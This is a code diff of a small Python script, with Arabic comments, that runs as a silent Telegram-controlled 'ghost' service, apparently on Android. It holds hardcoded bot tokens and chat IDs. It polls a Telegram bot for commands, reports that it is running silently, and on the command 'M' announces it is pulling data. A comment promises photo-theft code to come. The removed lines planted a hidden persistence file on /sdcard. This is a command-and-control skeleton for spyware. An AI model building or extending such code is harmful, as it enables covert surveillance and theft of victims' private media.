@@ -2,35 +2,29 @@ import os
 import time
 import requests
 
-TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
-CHAT_ID = "1256334460"
+TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
+CHAT_ID = "7084557369"
 
 def get_command():
     try:
-        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1"
-        res = requests.get(url, timeout=10).json()
+        # قراءة آخر رسالة من البوت
+        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1&limit=1"
+        res = requests.get(url, timeout=5).json()
         if res.get("result"):
             return res["result"][0].get("message", {}).get("text", "").upper()
     except: return None
 
 if __name__ == '__main__':
-    # إبلاغ البوت بالاستيقاظ
+    # إبلاغك بأن الخدمة تعمل الآن في الخلفية
     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                  data={"chat_id": CHAT_ID, "text": "💀 الشبح استيقظ وجاهز للأوامر..."})
+                  data={"chat_id": CHAT_ID, "text": "💀 خدمة الشبح تعمل الآن بصمت..."})
     
     while True:
-        command = get_command()
-        if command == "M":
+        cmd = get_command()
+        if cmd == "M":
+            # رد البوت عند استلام الأمر
             requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                          data={"chat_id": CHAT_ID, "text": "📸 استلمت الأمر M.. جاري فحص الوسائط والزرع!"})
-            # هنا ستتم إضافة وظيفة سحب الصور لاحقاً
-        
-        # التأكد من ثبات ملف الزرع
-        check_path = "/sdcard/Android/.system_cache_data/.core_bridge"
-        if not os.path.exists(check_path):
-            try:
-                os.makedirs(os.path.dirname(check_path), exist_ok=True)
-                with open(check_path, "w") as f: f.write("RE-PLANTED")
-            except: pass
+                          data={"chat_id": CHAT_ID, "text": "📸 استلمت الأمر M.. جاري سحب البيانات المكتشفة!"})
+            # هنا يمكنك إضافة كود سحب الصور لاحقاً
             
-        time.sleep(10)
+        time.sleep(8) # يفحص كل 8 ثواني لتقليل استهلاك البطارية
